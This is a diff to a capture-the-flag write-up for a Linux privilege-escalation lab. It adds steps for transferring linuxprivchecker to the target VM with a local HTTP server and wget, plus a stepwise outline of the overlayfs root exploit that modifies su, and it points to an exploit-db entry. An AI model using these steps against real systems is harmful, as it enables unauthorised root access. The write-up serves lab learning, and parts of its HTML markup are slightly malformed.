@@ -170,6 +170,14 @@ If you're on Linux edit your "/etc/hosts" file and add:<br>
   
 <p>To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:</p>
 
+<ul style="list-style-type:square">
+    <li>Download the linuxprivchecker file locally</li>
+    <li>Navigate to the file on your file system</li>
+    <li>Do: <code>python -m SimpleHTTPServer 1337</code>code> (leave this running)</li>
+    <li>On the VM you can now do: <code>wget [your IP]/<file>.py</file>code></li>
+</ul></p>
+
+<h3><strong>OR</strong></h3>
 
 > 4.1. <em>Enumerate the machine manually.</em><br><a id='4.1'></a>
 >> <code><strong>No answer needed</strong></code>
@@ -183,10 +191,19 @@ If you're on Linux edit your "/etc/hosts" file and add:<br>
 
 <p>This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:</p>
 
+<ul style="list-style-type:square">
+    <li>Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.</li>
+    <li>Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.</li>
+    <li>Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.</li>
+    <li>Make su on overlayfs world writable without changing the owner</li>
+    <li>Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.</li>
+    <li>Execute the modified su binary</li>
+</ul></p>
+
 
 <br>
 
-> 4.3. <em>You can download the exploit from here: https://www.exploit-db.com/exploits/37292</em><br><a id='4.3'></a>
+> 4.3. <em>You can download the exploit from here: <code>https://www.exploit-db.com/exploits/37292</code></em><br><a id='4.3'></a>
 >> <code><strong>No answer needed</strong></code>
 
 <br>
